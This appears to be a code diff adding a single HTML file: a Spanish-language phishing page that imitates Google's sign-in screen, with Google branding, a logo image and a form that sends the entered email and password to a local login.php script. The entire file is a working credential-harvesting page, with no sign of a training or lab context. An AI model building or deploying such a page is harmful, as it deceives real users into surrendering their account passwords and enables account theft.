@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        
+        .subtitle {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+        
+        .forgot {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        
+        .forgot a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .btn-next {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            float: right;
+        }
+        
+        .btn-next:hover {
+            background: #1557b0;
+        }
+        
+        .create-account {
+            text-align: left;
+            margin-top: 30px;
+        }
+        
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="google.png" alt="Google" class="logo">
+        <h1>Iniciar sesión</h1>
+        <p class="subtitle">Usa tu cuenta de Google</p>
+        
+        <form action="login.php" method="POST">
+            <div class="input-group">
+                <input type="email" name="email" placeholder="Correo electrónico o teléfono" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Introduce tu contraseña" required>
+            </div>
+            
+            <div class="forgot">
+                <a href="#">¿Has olvidado tu correo electrónico?</a>
+            </div>
+            
+            <div style="overflow: hidden;">
+                <button type="submit" class="btn-next">Siguiente</button>
+            </div>
+        </form>
+        
+        <div class="create-account">
+            <a href="#">Crear cuenta</a>
+        </div>
+        
+        <div class="footer">
+            <p>Español (España) ▼</p>
+        </div>
+    </div>
+</body>
+</html>
